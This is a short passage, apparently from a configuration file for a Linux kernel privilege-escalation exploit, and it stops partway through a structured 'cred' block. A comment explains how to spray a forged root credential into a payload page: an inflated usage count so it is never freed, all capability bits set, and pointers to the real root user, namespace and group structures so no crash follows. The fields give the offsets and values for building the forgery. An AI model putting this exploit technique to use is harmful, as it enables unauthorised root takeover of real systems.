# W2 sprays a liveable root cred into the payload page. usage is large and odd so
# the count can never reach 0 (cred_free() on a page that is not a slab object
# corrupts the allocator), the five capability words cover
# permitted/effective/bset/ambient, and user / user_ns / group_info point at the
# real root_user / init_user_ns / init_groups. Leaving those NULL survives only
# until the first getuid()/capable(), which dereferences cred->user_ns inside
# from_kuid_munged() and oopses -- and an oops here is a reboot.
cred {
  copy_size = 168
  usage_offset = 0
  usage_value = 2147483647
  caps_offset = 48
  caps_count = 5
  caps_value = -1
  ref_count = 3
  ref0_offset = 128
  ref1_offset = 136
